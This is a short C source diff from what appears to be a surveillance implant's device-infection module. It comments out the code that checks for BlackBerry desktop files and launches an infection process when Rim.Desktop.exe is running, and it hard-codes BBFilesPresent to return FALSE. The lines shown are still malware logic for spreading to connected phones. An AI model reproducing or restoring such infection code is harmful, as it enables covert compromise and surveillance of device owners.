@@ -237,7 +237,7 @@ BOOL BBFilesPresent()
 {
 	HANDLE hfile;
 	char check_path[_MAX_PATH];
-
+/*
 	hfile = FNC(CreateFileA)(HM_CompletePath(BB_INSTALL_NAME1, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
@@ -246,7 +246,8 @@ BOOL BBFilesPresent()
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(hfile);
-	return TRUE;
+	return TRUE;*/
+	return FALSE;
 }
 
 BOOL IsPDAInfected(WCHAR *mmc_path)
@@ -1182,7 +1183,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 			CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME*2);
 		}*/
 
-		if (infection_pda && BBFilesPresent() && HM_FindPid("Rim.Desktop.exe", FALSE)) {
+		/*if (infection_pda && BBFilesPresent() && HM_FindPid("Rim.Desktop.exe", FALSE)) {
 			STARTUPINFO si;
 		    PROCESS_INFORMATION pi;
 			ZeroMemory( &pi, sizeof(pi) );
@@ -1194,7 +1195,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 
 			if (pi.dwProcessId) 
 				SM_AddExecutedProcess(pi.dwProcessId);
-		}
+		}*/
 	}
 	return 0;
 #else
